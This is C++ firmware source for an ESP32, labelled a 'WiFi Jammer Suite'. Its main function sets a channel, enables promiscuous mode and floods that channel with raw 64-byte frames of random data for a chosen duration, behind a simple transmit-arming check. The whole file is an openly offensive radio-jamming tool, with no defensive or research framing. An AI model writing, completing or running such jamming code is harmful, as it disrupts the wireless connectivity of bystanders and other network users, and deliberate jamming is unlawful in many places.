#include "wifi_jammer_suite.h"
#include "tx_arm.h"
#include <WiFi.h>
#include <esp_wifi.h>

namespace {
volatile bool g_jamActive = false;
uint32_t g_jamCount = 0;

void sendJamPacket() {
    uint8_t jamData[64];
    for (int i = 0; i < 64; i++) {
        jamData[i] = (esp_random() % 256);
    }
    esp_wifi_80211_tx(WIFI_IF_STA, jamData, 64, false);
    g_jamCount++;
}
}

namespace WiFiJammerSuite {

JamResult jamWiFiNetwork(uint8_t channel, uint32_t durationMs, const String &method) {
    JamResult result{false, 0, durationMs, method};

    Serial.println("\n=== WiFi Jammer Suite ===");
    Serial.println("Channel: " + String(channel));
    Serial.println("Method: " + method);

    if (!TxArm::isArmed()) {
        Serial.println("✗ TX not armed");
        return result;
    }

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    g_jamActive = true;
    g_jamCount = 0;
    uint32_t startTime = millis();
    uint32_t deadline = startTime + durationMs;

    while ((int32_t)(millis() - deadline) < 0 && g_jamActive) {
        sendJamPacket();
        delayMicroseconds(100);
        if (g_jamCount % 100 == 0) {
            Serial.println("  [" + String(g_jamCount) + "] packets");
        }
    }

    g_jamActive = false;
    esp_wifi_set_promiscuous(false);

    result.success = true;
    result.jamPacketsCount = g_jamCount;
    Serial.println("✓ Complete: " + String(g_jamCount) + " jam packets");
    return result;
}

void stop() {
    g_jamActive = false;
    esp_wifi_set_promiscuous(false);
}

bool isActive() {
    return g_jamActive;
}

}  // namespace WiFiJammerSuite
